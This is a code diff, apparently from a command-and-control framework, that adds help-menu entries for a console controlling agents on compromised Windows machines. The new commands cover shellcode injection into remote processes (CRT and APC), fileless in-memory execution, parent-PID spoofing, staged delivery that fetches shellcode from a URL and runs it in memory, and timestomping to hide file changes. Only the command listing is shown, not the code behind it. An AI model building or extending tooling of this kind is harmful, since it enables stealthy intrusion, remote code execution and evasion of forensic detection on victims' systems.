@@ -137,6 +137,23 @@ func printConsoleHelp() {
 			{"fetch <id> <url> <remote-path> --method curl", "download via curl.exe"},
 			{"fetch <id> <url> <remote-path> --method powershell", "download via WebClient"},
 		}},
+		{"Process Injection (Level 2)", []entry{
+			{"inject remote <id> --pid <pid> --file <sc.bin>", "CRT injection into remote process"},
+			{"inject remote <id> --pid <pid> --file <sc.bin> --method apc", "APC injection (quieter)"},
+			{"inject self <id> --file <sc.bin>", "fileless in-memory exec in agent process"},
+			{"inject ppid <id> <exe> --ppid-name explorer.exe", "spawn with spoofed parent PID"},
+			{"inject ppid <id> <exe> --ppid <pid> --args \"-NoP whoami\"", "spawn with explicit PPID + args"},
+		}},
+		{"Staged Delivery (Level 2)", []entry{
+			{"staged <id> <url>", "fetch shellcode URL → exec in-memory (fileless)"},
+			{"staged <id> <url> --method crt --pid <pid>", "fetch → inject into remote PID"},
+			{"staged <id> <url> --wait", "wait for execution result"},
+		}},
+		{"Timestomp (Level 2)", []entry{
+			{"timestomp <id> <target>", "copy timestamps from kernel32.dll"},
+			{"timestomp <id> <target> --ref explorer.exe", "copy from reference file"},
+			{"timestomp <id> <target> --time 2021-06-15T09:00:00Z", "set explicit timestamp"},
+		}},
 		{"Queue & Server", []entry{
 			{"queue stats", "pending command overview"},
 			{"queue clear <id>", "flush pending queue"},
